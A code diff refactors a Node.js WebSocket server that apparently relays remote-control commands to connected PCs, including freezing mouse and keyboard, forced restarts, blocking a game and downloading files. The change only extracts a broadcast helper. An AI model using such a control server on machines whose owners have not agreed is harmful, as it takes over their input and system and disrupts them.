@@ -23,6 +23,13 @@ setInterval(() => {
 const knownCommands = ["FREEZE_MOUSE", "UNFREEZE_MOUSE", "FREEZE_KEYBOARD", "LIST_CLIENTS", "UNFREEZE_KEYBOARD", "IMAGE", "CALCULATOR", "SAFE_RESTART", "FORCE_RESTART", "AUDIO", "COOK_PC_UI", "CHANGE_WALLPAPER", "BLOCK_VALORANT", "UNBLOCK_VALORANT", "DOWNLOAD", "BYE"]; // ! TEXT_ IS A SPECIAL COMMAND
 const knownSpecialCommands = ["ALL"];
 
+function sendToAllClients(command, arg1) {
+  for (const [_, c] of clients) {
+    if (c.type === "ADM") continue;
+    c.socket.send(arg1 ? `${command}|${arg1}` : command);
+  }
+}
+
 wss.on("connection", (socket) => {
   let clientUUID = null;
 
@@ -105,17 +112,7 @@ wss.on("connection", (socket) => {
 
       if (knownSpecialCommands.includes(firstPart.toUpperCase())) {
         if (firstPart.toUpperCase() === "ALL") {
-          // Send to all clients
-          for (const [_, c] of clients) {
-            if (c.type === "ADM") continue;
-
-            if (arg1) {
-              c.socket.send(`${command}|${arg1}`);
-              continue;
-            }
-
-            c.socket.send(command);
-          }
+          sendToAllClients(command, arg1);
         }
         socket.send(`${command} Sent to all clients..`);
 
